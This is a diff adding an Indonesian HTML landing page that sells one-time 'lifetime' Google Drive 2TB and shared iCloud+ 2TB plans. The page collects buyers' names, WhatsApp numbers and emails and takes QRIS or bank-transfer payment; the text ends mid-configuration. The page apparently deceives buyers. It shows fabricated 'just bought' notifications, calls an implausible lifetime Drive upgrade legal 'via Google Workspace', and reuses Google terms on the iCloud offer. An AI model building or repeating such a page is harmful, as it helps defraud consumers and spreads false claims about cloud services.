@@ -1,0 +1,1044 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Upgrade Google Drive & Photos Unlimited - Penawaran Spesial!</title>
+    <link rel="icon" type="image/png"
+        href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/330px-Google_Drive_icon_%282020%29.svg.png">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            blue: '#007aff',
+                            hover: '#005ecb',
+                            bg: '#F2F2F7', // Apple system gray 6
+                            surface: '#FFFFFF',
+                            text: '#1D1D1F',
+                            textSec: '#86868B',
+                            border: '#D2D2D7'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', 'sans-serif'],
+                        display: ['SF Pro Display', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'sans-serif'],
+                    },
+                    boxShadow: {
+                        'soft': '0 4px 24px rgba(0,0,0,0.06)',
+                        'float': '0 8px 32px rgba(0,0,0,0.12)',
+                    },
+                    animation: {
+                        'fade-in': 'fadeIn 0.5s ease-out forwards',
+                        'slide-up': 'slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards',
+                    },
+                    keyframes: {
+                        fadeIn: {
+                            '0%': { opacity: '0' },
+                            '100%': { opacity: '1' },
+                        },
+                        slideUp: {
+                            '0%': { transform: 'translateY(20px)', opacity: '0' },
+                            '100%': { transform: 'translateY(0)', opacity: '1' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- Google Fonts (Optional fallback) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <!-- QR Code Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.1/qrcode.min.js"></script>
+
+    <!-- === KODE FACEBOOK PIXEL === -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '630583642253416');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=630583642253416&ev=PageView&noscript=1" /></noscript>
+    <!-- === AKHIR FACEBOOK PIXEL === -->
+
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            background-color: #F5F5F7;
+            color: #1D1D1F;
+        }
+
+        /* Hide Scrollbar for clean look */
+        ::-webkit-scrollbar {
+            width: 0px;
+            background: transparent;
+        }
+
+        /* Custom Modern Components */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .ios-input {
+            appearance: none;
+            background-color: #F5F5F7;
+            border: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+        .ios-input:focus {
+            background-color: #FFFFFF;
+            border-color: #007aff;
+            box-shadow: 0 0 0 4px rgba(0,122,255,0.1);
+        }
+
+        /* Segmented Control */
+        .segmented-control {
+            background: #E5E5EA;
+            padding: 4px;
+            border-radius: 99px;
+            position: relative;
+            display: flex;
+            user-select: none;
+        }
+        .segmented-pill {
+            position: absolute;
+            top: 4px;
+            bottom: 4px;
+            left: 4px;
+            width: calc(50% - 4px);
+            background: #FFFFFF;
+            border-radius: 99px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+            transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
+            z-index: 1;
+        }
+        .segmented-option {
+            flex: 1;
+            text-align: center;
+            padding: 8px 0;
+            z-index: 2;
+            font-weight: 500;
+            font-size: 14px;
+            color: #1D1D1F;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        /* Logic for pill movement */
+        #product-google:checked ~ .segmented-control .segmented-pill { transform: translateX(0); }
+        #product-icloud:checked ~ .segmented-control .segmented-pill { transform: translateX(100%); }
+
+        /* Carousel Animation */
+        .marquee-container {
+            mask-image: linear-gradient(to right, transparent, black 10%, black 90%, transparent);
+            -webkit-mask-image: linear-gradient(to right, transparent, black 10%, black 90%, transparent);
+        }
+        .marquee-content {
+            animation: scroll 40s linear infinite;
+        }
+        .marquee-content:hover {
+            animation-play-state: paused;
+        }
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        /* Payment Radio */
+        .payment-radio:checked + div {
+            border-color: #007aff;
+            background-color: #F0F9FF;
+        }
+        .payment-radio:checked + div .check-icon {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        /* Accordion Details */
+        details.details-accordion summary {
+            list-style: none;
+        }
+        details.details-accordion summary::-webkit-details-marker {
+            display: none;
+        }
+
+        /* Modal Transitions */
+        .modal {
+            transition: opacity 0.3s ease;
+            opacity: 0;
+            pointer-events: none;
+        }
+        .modal.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .modal-content {
+            transform: scale(0.95);
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .modal.active .modal-content {
+            transform: scale(1);
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid white;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Mobile specific fixes */
+        .safe-pb {
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+    </style>
+</head>
+
+<body class="bg-gray-50 min-h-screen">
+
+    <!-- Notification Toast -->
+    <div id="notifBox" class="fixed top-4 left-4 right-4 z-50 transform -translate-y-24 transition-transform duration-500 ease-out flex justify-center pointer-events-none">
+        <div class="bg-white/90 backdrop-blur shadow-float rounded-full px-5 py-3 flex items-center gap-3 border border-gray-100 max-w-sm">
+            <div class="bg-green-100 text-green-600 rounded-full p-1.5">
+                <i class="fas fa-check text-xs"></i>
+            </div>
+            <div class="text-sm">
+                <p class="font-medium text-gray-900"><span class="notif-name">Nama</span> baru saja membeli!</p>
+                <p class="text-xs text-gray-500">Baru saja</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <main id="main-content" class="max-w-xl mx-auto min-h-screen bg-white shadow-2xl relative overflow-hidden pb-24">
+        
+        <!-- Header -->
+        <header class="pt-8 pb-4 px-6 text-center bg-white sticky top-0 z-30 border-b border-gray-100/80 backdrop-blur-md bg-white/80">
+            <div class="inline-flex items-center gap-2 mb-2 bg-blue-50 px-3 py-1 rounded-full">
+                <i class="fas fa-shield-alt text-blue-600 text-xs"></i>
+                <span class="text-xs font-semibold text-blue-600 uppercase tracking-wide">Official Upgrade</span>
+            </div>
+            <h1 class="text-2xl font-bold tracking-tight text-gray-900">Upgrade Storage</h1>
+            <p class="text-gray-500 text-sm mt-1">Solusi penyimpanan aman & hemat.</p>
+        </header>
+
+        <div class="p-6 space-y-8 animate-fade-in">
+            
+            <!-- Product Toggle -->
+            <div class="relative">
+                <input type="radio" name="product" id="product-google" value="google" class="hidden" checked>
+                <input type="radio" name="product" id="product-icloud" value="icloud" class="hidden">
+                
+                <div class="segmented-control h-12">
+                    <div class="segmented-pill"></div>
+                    <label for="product-google" class="segmented-option flex items-center justify-center gap-2">
+                        <i class="fab fa-google text-sm"></i> Google Drive
+                    </label>
+                    <label for="product-icloud" class="segmented-option flex items-center justify-center gap-2">
+                        <i class="fab fa-apple text-sm"></i> iCloud+
+                    </label>
+                </div>
+            </div>
+
+            <!-- Product Card (Dynamic) -->
+            <div id="product-card" class="bg-gradient-to-br from-white to-gray-50 rounded-3xl p-6 border border-gray-200 shadow-soft relative overflow-hidden group transition-all duration-300">
+                <!-- Content injected by JS -->
+            </div>
+
+            <!-- Detailed Info Accordions -->
+            <div id="product-details-accordions" class="space-y-3">
+                 <!-- Injected by JS -->
+            </div>
+
+            <!-- Testimonials Marquee -->
+            <div class="space-y-3">
+                <div class="flex items-center justify-between px-1">
+                    <h3 class="text-sm font-semibold text-gray-900">Kata Mereka</h3>
+                    <span class="text-xs text-gray-500">1000+ Pelanggan Puas</span>
+                </div>
+                <div class="marquee-container overflow-hidden relative w-full h-24">
+                    <div id="testimonial-track" class="marquee-content flex gap-3 absolute top-0 left-0 h-full">
+                        <!-- Images injected by JS -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Form Section -->
+            <form id="orderForm" class="space-y-6">
+                
+                <!-- Data Diri -->
+                <div class="space-y-4">
+                    <h3 class="text-lg font-bold text-gray-900 flex items-center gap-2">
+                        <span class="bg-black text-white w-6 h-6 rounded-full flex items-center justify-center text-xs">1</span>
+                        Data Pemesan
+                    </h3>
+                    
+                    <div class="grid gap-4">
+                        <div class="relative group">
+                            <input type="text" id="nama" name="nama" required placeholder=" " class="ios-input block w-full px-4 py-3.5 rounded-xl text-gray-900 font-medium text-sm peer">
+                            <label for="nama" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-transparent px-4 peer-focus:px-4 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1 pointer-events-none">Nama Lengkap</label>
+                        </div>
+
+                        <div class="relative group">
+                            <input type="tel" id="whatsapp" name="whatsapp" required placeholder=" " class="ios-input block w-full px-4 py-3.5 rounded-xl text-gray-900 font-medium text-sm peer">
+                            <label for="whatsapp" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-transparent px-4 peer-focus:px-4 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1 pointer-events-none">Nomor WhatsApp</label>
+                        </div>
+
+                        <div class="relative group">
+                            <input type="email" id="email" name="email" required placeholder=" " class="ios-input block w-full px-4 py-3.5 rounded-xl text-gray-900 font-medium text-sm peer">
+                            <label for="email" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-transparent px-4 peer-focus:px-4 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1 pointer-events-none">Email (Gmail/iCloud)</label>
+                        </div>
+                    </div>
+                    
+                    <!-- Honeypot -->
+                    <input type="text" name="honeypot" style="display: none" tabindex="-1" autocomplete="off">
+                    <input type="hidden" name="sheetName" value="upstorage">
+                </div>
+
+                <!-- Payment Methods -->
+                <div class="space-y-4">
+                    <h3 class="text-lg font-bold text-gray-900 flex items-center gap-2">
+                        <span class="bg-black text-white w-6 h-6 rounded-full flex items-center justify-center text-xs">2</span>
+                        Metode Pembayaran
+                    </h3>
+                    
+                    <div id="payment-methods-grid" class="grid grid-cols-2 gap-3">
+                        <!-- Payment options injected here -->
+                    </div>
+                    
+                    <div class="bg-blue-50/50 p-4 rounded-xl flex items-start gap-3 border border-blue-100">
+                        <i class="fas fa-lock text-blue-600 mt-1"></i>
+                        <p class="text-xs text-gray-600 leading-relaxed">
+                            Transaksi Anda dilindungi dengan enkripsi keamanan tingkat tinggi. Garansi uang kembali jika upgrade gagal.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Order Summary -->
+                <div id="order-summary" class="bg-gray-50 rounded-2xl p-5 border border-gray-200">
+                    <!-- Summary injected by JS -->
+                </div>
+
+            </form>
+
+            <!-- FAQ Accordion -->
+            <div class="pt-6 border-t border-gray-200">
+                <h3 class="font-bold text-gray-900 mb-4 text-center">Pertanyaan Umum</h3>
+                <div id="faq-container" class="space-y-2">
+                    <!-- FAQ injected here -->
+                </div>
+            </div>
+
+            <footer class="text-center text-xs text-gray-400 pb-8 pt-4">
+                &copy; <span id="currentYear"></span> InDrive ID. All rights reserved.
+            </footer>
+        </div>
+
+        <!-- Floating Bottom CTA -->
+        <div class="fixed bottom-0 left-0 right-0 bg-white/80 backdrop-blur-lg border-t border-gray-200 p-4 safe-pb z-40 max-w-xl mx-auto">
+            <button id="submit-btn" type="button" onclick="handleFormSubmit()" class="w-full bg-[#007aff] hover:bg-[#005ecb] text-white font-semibold rounded-2xl py-4 shadow-lg shadow-blue-500/30 transition-all transform active:scale-[0.98] flex items-center justify-center gap-2 text-[17px]">
+                <span>Beli Sekarang</span>
+                <i class="fas fa-arrow-right text-sm"></i>
+            </button>
+        </div>
+    </main>
+
+    <!-- Payment Instruction Page (Overlay) -->
+    <div id="payment-overlay" class="fixed inset-0 bg-white z-[60] overflow-y-auto hidden">
+        <div class="max-w-xl mx-auto min-h-screen bg-gray-50">
+            <!-- Header -->
+            <div class="bg-gray-900 text-white p-6 sticky top-0 z-10 shadow-lg">
+                <h2 class="text-lg font-bold text-center">Selesaikan Pembayaran</h2>
+                <div id="countdown-timer" class="flex justify-center gap-2 mt-3 text-sm font-mono bg-white/10 py-2 rounded-lg backdrop-blur">
+                    <!-- Timer -->
+                </div>
+            </div>
+
+            <div class="p-6 space-y-6">
+                <!-- Total Amount Card -->
+                <div class="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 text-center">
+                    <p class="text-sm text-gray-500 mb-1">Total Pembayaran</p>
+                    <div class="flex items-center justify-center gap-3 mb-2">
+                        <h1 id="payment-total" class="text-3xl font-bold text-blue-600 tracking-tight">Rp0</h1>
+                        <button onclick="copyAmount()" class="text-gray-400 hover:text-blue-600 transition-colors">
+                            <i class="far fa-copy"></i>
+                        </button>
+                    </div>
+                    <div class="text-xs text-orange-500 bg-orange-50 inline-block px-3 py-1 rounded-full border border-orange-100">
+                        <i class="fas fa-exclamation-circle mr-1"></i> Bayar sesuai nominal hingga 3 digit terakhir
+                    </div>
+                </div>
+
+                <!-- Account Details -->
+                <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
+                    <div class="p-4 bg-gray-50 border-b border-gray-200 flex justify-between items-center">
+                        <span class="text-sm font-medium text-gray-600">Transfer ke</span>
+                        <div id="payment-logo-container" class="h-6 w-auto"></div>
+                    </div>
+                    <div class="p-6">
+                        <div id="payment-details-content" class="text-center">
+                            <!-- Dynamic Content (QR or Number) -->
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Instructions Accordion -->
+                <div class="bg-white rounded-2xl shadow-sm border border-gray-200 p-4">
+                    <h3 class="font-bold text-gray-900 mb-3">Cara Pembayaran</h3>
+                    <div id="payment-instructions-list" class="space-y-2">
+                        <!-- Dynamic Instructions -->
+                    </div>
+                </div>
+
+                <!-- Action Buttons -->
+                <div class="space-y-3 pt-4 pb-12">
+                    <a id="wa-confirm-btn" href="#" target="_blank" class="block w-full bg-green-500 hover:bg-green-600 text-white font-bold rounded-xl py-3.5 text-center shadow-lg shadow-green-500/20 transition-all">
+                        <i class="fab fa-whatsapp mr-2"></i> Konfirmasi ke Admin
+                    </a>
+                    <button onclick="location.reload()" class="block w-full bg-white border border-gray-300 text-gray-700 font-semibold rounded-xl py-3.5 text-center hover:bg-gray-50 transition-all">
+                        Kembali ke Beranda
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Image Modal -->
+    <div id="imageModal" class="modal fixed inset-0 z-[70] bg-black/95 flex items-center justify-center p-4">
+        <button onclick="closeImageModal()" class="absolute top-6 right-6 text-white text-4xl">&times;</button>
+        <div class="relative w-full max-w-3xl">
+            <img id="modalImage" src="" class="w-full h-auto rounded-lg shadow-2xl">
+            <button onclick="prevImage()" class="absolute left-0 top-1/2 -translate-y-1/2 -translate-x-4 bg-white/20 hover:bg-white/40 text-white p-3 rounded-full backdrop-blur transition-all">
+                <i class="fas fa-chevron-left"></i>
+            </button>
+            <button onclick="nextImage()" class="absolute right-0 top-1/2 -translate-y-1/2 translate-x-4 bg-white/20 hover:bg-white/40 text-white p-3 rounded-full backdrop-blur transition-all">
+                <i class="fas fa-chevron-right"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Alert Modal -->
+    <div id="alertModal" class="modal fixed inset-0 z-[80] bg-black/50 backdrop-blur-sm flex items-center justify-center p-6">
+        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-sm w-full p-6 text-center">
+            <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
+                <i class="fas fa-info text-2xl"></i>
+            </div>
+            <h3 id="alertTitle" class="text-lg font-bold text-gray-900 mb-2">Judul</h3>
+            <p id="alertMessage" class="text-gray-500 text-sm mb-6 leading-relaxed">Pesan</p>
+            <button onclick="closeAlertModal()" class="w-full bg-gray-900 text-white font-medium rounded-xl py-3 hover:bg-gray-800 transition-colors">
+                OK, Saya Mengerti
+            </button>
+        </div>
+    </div>
+
+    <!-- Details Modal -->
+    <div id="detailsModal" class="modal fixed inset-0 z-[75] bg-black/50 backdrop-blur-sm flex items-end sm:items-center justify-center">
+        <div class="modal-content bg-white w-full max-w-md rounded-t-3xl sm:rounded-3xl p-6 max-h-[85vh] overflow-y-auto relative">
+             <div class="w-12 h-1 bg-gray-300 rounded-full mx-auto mb-6 sm:hidden"></div>
+             <button onclick="closeDetailsModal()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
+                <i class="fas fa-times text-xl"></i>
+             </button>
+             <h3 class="text-xl font-bold mb-6">Detail Paket</h3>
+             <div id="detailsContent" class="space-y-4">
+                 <!-- Injected -->
+             </div>
+        </div>
+    </div>
+
+    <script>
+        // --- DATA & CONFIG ---
+        const products = {
+            google: {
+                id: 'google',
+                name: "Bundling Google 2TB",
+                price: 250000,
+                normalPrice: 1579000,
+                title: "Google Drive 2TB",
+                tagline: "Sekali Bayar, Seumur Hidup",
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/330px-Google_Drive_icon_%282020%29.svg.png',
+                features: ["Kapasitas 2TB (Drive + Photos)", "Akun Pribadi Anda Sendiri", "Sekali Bayar Seumur Hidup", "Garansi & Support Full"],
+                featuresList: [
+                    "<strong>Kapasitas 2TB:</strong> Nikmati penyimpanan raksasa 2TB yang terbagi untuk Google Drive, Google Photos, dan Gmail.",
+                    "<strong>Akses File Di Mana Saja:</strong> Buka dan edit file Anda dari komputer, tablet, atau smartphone.",
+                    "<strong>Satu Solusi Terintegrasi:</strong> Semua kebutuhan penyimpanan Anda dalam satu paket hemat.",
+                    "<strong>Keamanan Kelas Dunia:</strong> File Anda dilindungi oleh infrastruktur keamanan canggih dari Google.",
+                    "<strong>Berbagi & Kolaborasi Mudah:</strong> Bagikan file dan folder dengan mudah, serta bekerja bersama secara real-time.",
+                    "<strong>Sekali Bayar Seumur Hidup:</strong> Tanpa biaya langganan bulanan atau tahunan.",
+                    "<strong>Gunakan Akun Pribadi Anda:</strong> Upgrade dilakukan langsung pada akun Google yang sudah Anda miliki.",
+                    "<strong>100% Aman & Bergaransi:</strong> Produk asli dengan jaminan privasi penuh."
+                ],
+                policyHTML: `
+                <p class="mb-4 text-sm leading-relaxed">Dengan menggunakan layanan ini, Anda setuju untuk terikat pada S&K kami. Layanan ini adalah pembayaran satu kali untuk manfaat seumur hidup, tunduk pada kebijakan Google yang berlaku.</p>
+                <ul class="list-disc list-inside space-y-2 text-sm">
+                    <li>Layanan untuk penggunaan wajar dan tidak melanggar hukum.</li>
+                    <li>Garansi penuh jika upgrade gagal karena kesalahan kami.</li>
+                    <li>Garansi tidak mencakup pemblokiran akun akibat pelanggaran oleh pengguna.</li>
+                    <li>Perubahan kebijakan Google di masa depan berada di luar kendali kami.</li>
+                </ul>`,
+                testimonials: [
+                    "https://pixvid.org/images/2025/11/04/kS2aB.jpg", "https://pixvid.org/images/2025/11/04/kSBPf.jpg",
+                    "https://pixvid.org/images/2025/11/04/kSBrm.jpg", "https://pixvid.org/images/2025/11/04/kSBoz.jpg",
+                    "https://pixvid.org/images/2025/11/04/kSBXl.jpg", "https://pixvid.org/images/2025/11/04/kSNUY.jpg",
+                    "https://pixvid.org/images/2025/11/04/kSNlo.jpg", "https://pixvid.org/images/2025/11/04/kSN6d.jpg",
+                    "https://pixvid.org/images/2025/11/04/kSNsb.jpg", "https://pixvid.org/images/2025/11/04/kScmN.jpg",
+                    "https://pixvid.org/images/2025/11/04/kSchv.jpg", "https://pixvid.org/images/2025/11/04/kSc95.jpg",
+                    "https://pixvid.org/images/2025/11/04/kScN7.jpg"
+                ],
+                faq: [
+                    { q: "Apakah ini benar-benar 2TB dan seumur hidup?", a: "Ya, benar. Anda akan mendapatkan penyimpanan 2TB untuk Google Drive dengan sistem pembayaran sekali untuk selamanya. Tidak ada biaya bulanan atau tahunan tersembunyi." },
+                    { q: "Bagaimana proses upgrade untuk Google Drive?", a: "Prosesnya otomatis dan terintegrasi dengan akun Google Anda. Setelah pembayaran, penyimpanan pada Google Drive Anda akan langsung ter-upgrade menjadi 2TB. Anda tidak perlu melakukan apa-apa lagi dan bisa langsung menikmati kapasitas 2TB di akun pribadi Anda." },
+                    { q: "Apakah ini aman dan legal?", a: "Tentu saja. Metode yang kami gunakan adalah sah melalui fitur Google Workspace. Kami tidak pernah meminta password Anda (untuk upgrade Drive) dan privasi file Anda 100% terjamin. Anda memiliki kontrol penuh atas data Anda." },
+                    { q: "Apa bedanya dengan langganan Google One?", a: "Google One adalah layanan langganan resmi dari Google dengan kuota terbatas (misal 2TB) dan biaya bulanan/tahunan. Produk kami memberikan Anda penyimpanan&nbsp;2TB&nbsp;dengan sistem&nbsp;sekali bayar untuk selamanya, melalui metode upgrade langsung pada akun Anda." },
+                    { q: "Bisakah saya memindahkan file lama saya?", a: "Tentu bisa. Karena upgrade ini langsung diterapkan pada akun Google Drive pribadi Anda, semua file lama Anda akan tetap ada di tempatnya dan secara otomatis menjadi bagian dari penyimpanan 2TB yang baru. Anda tidak perlu memindahkan file atau folder apa pun." },
+                    { q: "Berapa lama proses aktivasinya?", a: "Prosesnya sangat cepat. Setelah Anda melakukan konfirmasi pembayaran, aktivasi biasanya selesai dalam waktu 5-15 menit, maksimal 1x24 jam." },
+                    { q: "Apakah ada garansi?", a: "Kami memberikan garansi uang kembali penuh jika proses upgrade gagal karena kesalahan dari pihak kami. Kami juga memberikan garansi layanan seumur hidup. Namun, garansi tidak berlaku jika akun Anda dibatasi oleh Google karena melanggar kebijakan mereka (misalnya menyimpan file ilegal seperti software bajakan, film/musik tanpa lisensi, konten pornografi, menyebarkan virus/malware, dll)." }
+                ]
+            },
+            icloud: {
+                id: 'icloud',
+                name: "iCloud+ 2TB",
+                price: 350000,
+                normalPrice: 2028000,
+                title: "iCloud+ 2TB Premium",
+                tagline: "Langganan 1 Tahun Hemat",
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/ICloud_logo.svg/320px-ICloud_logo.svg.png',
+                features: ["Penyimpanan 2TB", "Private Relay & Hide My Email", "Durasi 1 Tahun Full", "Untuk Apple ID Pribadi"],
+                featuresList: [
+                    "<strong>Kapasitas 2TB:</strong> Simpan semua foto, video, file, dan backup perangkat Anda dengan aman.",
+                    "<strong>Relai Pribadi iCloud:</strong> Jelajahi web dengan lebih aman dan pribadi di Safari.",
+                    "<strong>Sembunyikan Email Saya:</strong> Buat alamat email acak untuk menjaga kerahasiaan email pribadi Anda.",
+                    "<strong>Domain Email Khusus:</strong> Personalisasi alamat email iCloud Anda dengan domain sendiri.",
+                    "<strong>Video Aman HomeKit:</strong> Simpan rekaman kamera keamanan rumah Anda dengan enkripsi end-to-end.",
+                    "<strong>Gunakan Email Pribadi Anda:</strong> Upgrade dilakukan langsung pada akun Apple ID (iCloud) pribadi Anda.",
+                    "<strong>100% Aman & Bergaransi:</strong> Proses legal melalui fitur Apple One Premier, privasi terjamin."
+                ],
+                policyHTML: `
+                <p class="mb-4 text-sm leading-relaxed">Dengan menggunakan layanan ini, Anda setuju untuk terikat pada S&K kami. Layanan ini adalah pembayaran satu kali untuk manfaat seumur hidup, tunduk pada kebijakan Google yang berlaku.</p>
+                <ul class="list-disc list-inside space-y-2 text-sm">
+                    <li>Layanan untuk penggunaan wajar dan tidak melanggar hukum.</li>
+                    <li>Garansi penuh jika upgrade gagal karena kesalahan kami.</li>
+                    <li>Garansi tidak mencakup pemblokiran akun akibat pelanggaran oleh pengguna.</li>
+                    <li>Perubahan kebijakan Google di masa depan berada di luar kendali kami.</li>
+                </ul>`,
+                testimonials: [
+                    "https://pixvid.org/images/2025/10/24/kEZMJ.jpg", "https://pixvid.org/images/2025/10/24/kEZcj.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEgWD.jpg", "https://pixvid.org/images/2025/10/24/kEgFp.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEgxI.jpg", "https://pixvid.org/images/2025/10/24/kEgL0.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEzzW.jpg", "https://pixvid.org/images/2025/10/24/kEzuR.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEzGt.jpg", "https://pixvid.org/images/2025/10/24/kEzfK.jpg",
+                    "https://pixvid.org/images/2025/10/24/kE7Hy.jpg", "https://pixvid.org/images/2025/10/24/kE7KG.jpg",
+                    "https://pixvid.org/images/2025/10/24/kE7as.jpg", "https://pixvid.org/images/2025/10/24/kEHPL.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEHrU.jpg", "https://pixvid.org/images/2025/10/24/kEHoZ.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEHXr.jpg", "https://pixvid.org/images/2025/10/24/kEQUw.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEQlE.jpg", "https://pixvid.org/images/2025/10/24/kEQ69.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEQsS.jpg", "https://pixvid.org/images/2025/10/24/kERm2.jpg",
+                    "https://pixvid.org/images/2025/10/24/kERhV.jpg", "https://pixvid.org/images/2025/10/24/kER9k.jpg",
+                    "https://pixvid.org/images/2025/10/24/kERNg.jpg", "https://pixvid.org/images/2025/10/24/kErCO.jpg",
+                    "https://pixvid.org/images/2025/10/24/kErwF.jpg", "https://pixvid.org/images/2025/10/24/kErdn.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEr3M.jpg", "https://pixvid.org/images/2025/10/24/kEOZa.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEOYB.jpg", "https://pixvid.org/images/2025/10/24/kEOAf.jpg",
+                    "https://pixvid.org/images/2025/10/24/kEOVm.jpg", "https://pixvid.org/images/2025/10/24/kEl7z.jpg",
+                    "https://pixvid.org/images/2025/10/24/kElJl.jpg"
+                ],
+                faq: [
+                    { q: "Apakah ini benar-benar 2TB?", a: "Ya, Anda akan mendapatkan kapasitas 2TB. Kami menawarkan paket berlangganan selama 1 tahun. Paket ini menggunakan email pribadi Anda." },
+                    { q: "Bagaimana proses upgrade iCloud+ ini?", a: "Prosesnya sangat mudah. Kami akan mengundang email (Apple ID) Anda untuk bergabung ke dalam langganan Apple One Premier kami. Setelah Anda menerima undangan, kapasitas iCloud Anda akan otomatis menjadi 2TB beserta semua fitur iCloud+." },
+                    { q: "Apakah ini aman dan legal?", a: "Tentu saja. Metode yang kami gunakan 100% legal melalui fitur Apple Family Sharing. Kami tidak pernah meminta password Apple ID Anda. Privasi data dan file Anda sepenuhnya terjamin karena setiap anggota keluarga memiliki penyimpanan pribadi yang tidak bisa diakses oleh anggota lain." },
+                    { q: "Apa bedanya dengan langganan iCloud+ langsung ke Apple?", a: "Langganan langsung ke Apple memerlukan pembayaran bulanan atau tahunan yang berulang. Dengan paket kami, Anda bisa mendapatkan harga yang jauh lebih murah." },
+                    { q: "Apakah file lama saya akan hilang?", a: "Tidak akan. Karena upgrade ini diterapkan pada akun Apple ID pribadi Anda, semua file dan data lama Anda akan tetap aman di tempatnya dan secara otomatis menjadi bagian dari penyimpanan 2TB yang baru." },
+                    { q: "Berapa lama proses aktivasinya?", a: "Prosesnya sangat cepat. Setelah Anda melakukan konfirmasi pembayaran, undangan akan kami kirimkan dan aktivasi biasanya selesai dalam waktu 5-15 menit." },
+                    { q: "Apakah ada garansi?", a: "Kami memberikan garansi uang kembali penuh jika proses upgrade gagal karena kesalahan dari pihak kami. Garansi tidak berlaku jika akun Anda dibatasi oleh Apple karena melanggar kebijakan mereka (misalnya menyimpan file ilegal, dll)." }
+                ]
+            }
+        };
+
+        const paymentAccounts = {
+            qris: {
+                name: 'QRIS',
+                holder: 'Epay',
